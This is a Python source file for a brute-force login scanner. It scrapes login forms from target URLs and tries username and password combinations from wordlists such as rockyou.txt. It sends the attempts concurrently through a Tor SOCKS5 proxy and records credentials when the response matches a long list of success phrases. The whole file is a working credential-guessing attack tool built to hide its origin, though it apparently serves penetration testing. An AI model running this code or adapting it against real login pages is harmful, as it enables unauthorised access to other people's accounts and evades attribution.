import requests 
from bs4 import BeautifulSoup 
from urllib.parse import urljoin 
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError 
import json 
from tqdm import tqdm

usernames_file = "./dics/usernames.txt" 
passwords_file = "./dics/rockyou.txt"

class BruteForceScannerClass:

    def __init__(self, urls, proxy_address="127.0.0.1", proxy_port=9050):
        self.urls = urls
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }
        self.input_name_users = None
        self.num_threads = 5
        self.results = {}
        self.timeout = 10

    def get_forms(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            return []

    def form_details(self, form):
        details_of_form = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        details_of_form['action'] = action
        details_of_form['method'] = method
        details_of_form['inputs'] = inputs
        return details_of_form

    def login_successful(self, response):
        success_messages = [
            "Inicio de sesión exitoso!",
            "Login successful!",
            "Welcome",
            "You're in!",
            "Access granted!",
            "Authenticated successfully.",
            "Welcome back!",
            "Successful login!",
            "Access approved!",
            "You have successfully logged in.",
            "Welcome!",
            "You're now logged in.",
            "Access granted!",
            "Login successful!",
            "Authenticated!",
            "Welcome back!",
            "Welcome! You're logged in.",
            "Access confirmed!",
            "Successful authentication!",
            "You've been granted access!",
            "Welcome! Access granted.",
            "You're in! Welcome.",
            "Login complete!",
            "Access authorized!",
            "Authentication successful!",
            "Access permitted!",
            "Welcome! Access approved.",
            "Successful login! Welcome.",
            "Access allowed!",
            "You're logged in! Welcome.",
            "Access granted! Welcome.",
            "Welcome! Login successful.",
            "You have access!",
            "Welcome! You have successfully logged in.",
            "Access authorized! Welcome.",
            "Successful authentication! Welcome.",
            "Access confirmed! Welcome.",
            "You're in! Access granted.",
            "Login successful! Welcome back.",
            "Authenticated! Welcome back.",
            "Welcome! You're now logged in.",
            "Access granted! You're in.",
            "Login complete! Welcome.",
            "Access authorized! Welcome back.",
            "Authentication successful! Welcome back.",
            "Access permitted! Welcome.",
            "Welcome! Access allowed.",
            "Successful login! Welcome back.",
            "Access allowed! You're logged in.",
            "You're logged in! Access granted.",
            "Access granted! You're in.",
            "Welcome! Login complete.",
            "You have access! Welcome.",
            "Welcome! You have access.",
            "Access authorized! Login successful.",
            "Successful authentication! Access granted.",
            "Access confirmed! You're in.",
            "Login successful! Access granted.",
            "Authenticated! You're logged in.",
            "Welcome! Access confirmed.",
            "You're in! Successful login.",
            "Access approved! Welcome.",
            "You have successfully logged in! Welcome.",
            "Access granted! Successful login.",
            "Welcome back! You're now logged in.",
            "Login complete! Access granted.",
            "Access authorized! You have access.",
            "Authentication successful! Access permitted.",
            "Access confirmed! Welcome back.",
            "You're in! Access confirmed.",
            "Login successful! You have access.",
            "Authenticated! Access granted.",
            "Welcome! Access allowed.",
            "You're logged in! Welcome back.",
            "Access granted! Access approved.",
            "Welcome! Login complete.",
            "You have access! Access authorized.",
            "Access authorized! You're logged in.",
            "Successful authentication! Access allowed.",
            "Access confirmed! You're logged in.",
            "You're in! Access permitted.",
            "Login successful! Access confirmed.",
            "Authenticated! You have access.",
            "Welcome! Access granted.",
            "You're now logged in! Welcome.",
            "Access approved! Login successful.",
            "You have access! Welcome back.",
            "Access granted! Authentication successful.",
            "Welcome back! Access confirmed.",
            "Login complete! You're in.",
            "Access authorized! Access granted.",
            "Authentication successful! Access allowed.",
            "Access confirmed! Access granted.",
            "You're in! Login successful.",
            "Login successful! Access allowed.",
            "Authenticated! Access confirmed.",
            "Welcome! Access confirmed.",
            "Access approved! Access granted.",
            "You have access! Access confirmed.",
            "Access granted! Access permitted.",
            "Welcome back! Login successful.",
            "Login complete! Access confirmed.",
            "Access authorized! You're in.",
            "Authentication successful! Access granted.",
            "Access confirmed! Access allowed.",
            "You're in! Access approved.",
            "Login successful! Access granted.",
            "Authenticated! Access permitted.",
            "Welcome! You have access.",
            "You're now logged in! Access granted.",
            "Access approved! Access allowed.",
            "You have access! Access approved.",
            "Access granted! You have access.",
            "Welcome back! Access allowed.",
            "Access granted"
        ]

        for message in success_messages:
            if message in response.text:
                return True
        return False

    def send_login_request(self, url, action, method, headers, credentials):
        try:
            if method.lower() == "post":
                res = self.session.post(urljoin(url, action), data=credentials,
                                        headers=headers, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)
            elif method.lower() == "get":
                res = self.session.get(urljoin(url, action), params=credentials,
                                    headers=headers, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)

            res.raise_for_status()

            if self.login_successful(res):
                result = {
                    "Credentials": credentials,
                    "Success": True,
                    "Response": res.text
                }
                self.results.setdefault(url, []).append(result)
            elif res.is_redirect:
                new_url = urljoin(url, res.headers.get('location', ''))
                new_response = self.session.get(new_url, proxies=self.proxies, allow_redirects=False, timeout=self.timeout)
                new_response_text = new_response.content.decode('utf-8')
                if self.login_successful(new_response):
                    result = {
                        "Credentials": credentials,
                        "Success": True,
                        "Response": new_response_text
                    }
                    self.results.setdefault(url, []).append(result)
        except Exception as e:
            error_message = f"{str(e)}"
            result = {
                "Error": error_message
            }
            self.results.setdefault(url, []).append(result)

    def brute_force(self, usernames_file, passwords_file):
        for url in tqdm(self.urls, desc="Scanning URLs for Brute Force"):  
            input_names = self.find_login_inputs_with_timeout(url)
            if not input_names or not self.input_name_users or len(self.input_name_users) < 2:
                error_message = "Invalid form inputs."
                result = {"Error": error_message}
                self.results.setdefault(url, []).append(result)
                continue  

            with open(usernames_file, 'r') as user_file:
                usernames = [line.strip() for line in user_file]
            with open(passwords_file, 'r') as password_file:
                passwords = [line.strip() for line in password_file]

            credentials_list = [{self.input_name_users[0]: user, self.input_name_users[1]: password}
                                for user in usernames[:10] for password in passwords[:10]]

            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                futures = []
                for credentials in credentials_list:
                    futures.append(executor.submit(self.send_login_request,
                                                    url, input_names['action'], input_names['method'],
                                                    {'User-Agent': 'pentest'}, credentials))

                # Actualiza la barra de progreso por cada futuro completado
                for future in tqdm(as_completed(futures), total=len(futures), desc="Attempting logins"):
                    try:
                        future.result(timeout=self.timeout)
                    except Exception as e:
                        result = {"Error": str(e)}
                        self.results.setdefault(url, []).append(result)

        if not self.results:
            return json.dumps({"No results found."})
        return json.dumps(self.results)

    def find_login_inputs_with_timeout(self, url):
        with ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(self.find_login_inputs, url)
            try:
                return future.result(timeout=self.timeout)
            except TimeoutError:
                error_message = f"Timeout retrieving content."
                result = {
                    "Error": error_message
                }
                self.results.setdefault(url, []).append(result)
                return {}

    def find_login_inputs(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, timeout=self.timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            login_inputs = soup.find_all('input', {'type': ['text', 'password']})
            form = soup.find("form")
            if form is None:
                raise KeyError("Form not found")
            input_names = {'action': form['action'], 'method': form['method']}
            self.input_name_users = [input_tag.attrs.get("name") for input_tag in login_inputs]
            return input_names
        except requests.exceptions.RequestException as e:
            error_message = f"Unable to retrieve content."
            result = {
                "Error": error_message
            }
            self.results.setdefault(url, []).append(result)
            return {}
        except KeyError as ke:
            error_message = f"Error: Unable to find form details."
            result = {
                "Error": error_message
            }
            self.results.setdefault(url, []).append(result)
            return {}
